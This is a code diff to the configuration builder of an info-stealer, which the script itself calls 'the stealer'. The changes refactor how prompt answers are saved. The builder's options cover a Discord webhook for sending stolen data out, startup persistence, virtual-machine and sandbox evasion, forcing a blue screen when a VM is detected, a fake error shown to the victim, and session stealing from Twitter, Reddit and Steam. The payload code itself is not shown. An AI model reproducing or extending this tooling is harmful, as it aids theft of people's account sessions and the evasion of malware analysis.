@@ -24,6 +24,11 @@ console.log('========================================================');
 console.log('');
 
 (async () => {
+  const saveToConfig = (key, done, value, subKey) => {
+    subKey ? config[key][subKey] = value : config[key] = value;
+    done(null, true);
+  };
+
   await inquirer
     .prompt([
       {
@@ -34,8 +39,7 @@ console.log('');
         validate(input) {
           const done = this.async();
           if (input && input.trim() !== '') {
-            config.name = input;
-            done(null, true);
+            saveToConfig('name', done, input);
           } else {
             done('Name is not valid!');
           }
@@ -49,8 +53,7 @@ console.log('');
         validate(input) {
           const done = this.async();
           if (input && input.trim() !== '') {
-            config.filename = input;
-            done(null, true);
+            saveToConfig('filename', done, input);
           } else {
             done('Name is not valid!');
           }
@@ -64,9 +67,7 @@ console.log('');
         validate(input) {
           const done = this.async();
           if (input && /https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/[0-9]{17,19}\/([a-zA-Z0-9-_]+)/g.test(input)) {
-            if (!config.webhook) config.webhook = {};
-            config.webhook.url = input;
-            done(null, true);
+            saveToConfig('webhook', done, input, 'url');
           } else {
             done('Webhook URL is not valid!');
           }
@@ -76,26 +77,38 @@ console.log('');
         name: 'options__add_to_startup',
         type: 'confirm',
         default: config.addToStartup,
-        message: 'Add to startup programs?'
+        message: 'Add to startup programs?',
+        validate(input) {
+          saveToConfig('addToStartup', this.async(), input);
+        }
       },
       {
         name: 'options__anti_vm',
         type: 'confirm',
         default: config.vmProtect,
-        message: 'Protect against Virtual Machines and sandboxes?'
+        message: 'Protect against Virtual Machines and sandboxes?',
+        validate(input) {
+          saveToConfig('vmProtect', this.async(), input);
+        }
       },
       {
         name: 'options__bsod_if_vm',
         type: 'confirm',
         default: config.bsodIfVm,
         when: (answers) => answers['options__anti_vm'] === true,
-        message: 'If a Virtual Machine or a sandbox is detected, should the stealer create a BSOD on the computer?'
+        message: 'If a Virtual Machine or a sandbox is detected, should the stealer create a BSOD on the computer?',
+        validate(input) {
+          saveToConfig('bsodIfVm', this.async(), input);
+        }
       },
       {
         name: 'options__fake_error',
         type: 'confirm',
         default: config.fakeError,
-        message: 'Show a fake error to the user?'
+        message: 'Show a fake error to the user?',
+        validate(input) {
+          saveToConfig('fakeError', this.async(), input);
+        }
       },
       {
         name: 'options__fake_error_customization',
@@ -109,14 +122,20 @@ console.log('');
         type: 'string',
         when: (answers) => answers['options__fake_error_customization'] === true,
         default: config.fakeErrorDetails.title,
-        message: 'Error title:'
+        message: 'Error title:',
+        validate(input) {
+          saveToConfig('fakeErrorDetails', this.async(), input, 'title');
+        }
       },
       {
         name: 'options__fake_error_message',
         type: 'string',
         when: (answers) => answers['options__fake_error_customization'] === true,
         default: config.fakeErrorDetails.message,
-        message: 'Error message:'
+        message: 'Error message:',
+        validate(input) {
+          saveToConfig('fakeErrorDetails', this.async(), input, 'message');
+        }
       },
       {
         name: 'options__session_stealing',
@@ -126,7 +145,14 @@ console.log('');
           { name: 'Twitter', value: 'twitter', checked: config.sessionStealing.twitter },
           { name: 'Reddit', value: 'reddit', checked: config.sessionStealing.reddit },
           { name: 'Steam', value: 'steam', checked: config.sessionStealing.steam },
-        ]
+        ],
+        validate(input) {
+          saveToConfig('sessionStealing', () => {}, {});
+          input.forEach(i => {
+            saveToConfig('sessionStealing', () => {}, true, i);
+          });
+          this.async()(null, true);
+        }
       },
       {
         name: 'custom_icon',
@@ -146,14 +172,14 @@ console.log('');
               pngToIco(input)
                 .then(ico => {
                   writeFileSync(resolve('icon.ico'), ico);
-                  done(null, true);
                   icon = input;
+                  done(null, true);
                 }).catch(e => {
                   done(`${e.message} Please check that your file is not damaged, corrupted, and is readable.`);
                 });
             } else if (extname(input) === '.ico') {
-              done(null, true);
               icon = input;
+              done(null, true);
             } else {
               done('The icon must be a .ico or .png file!');
             }
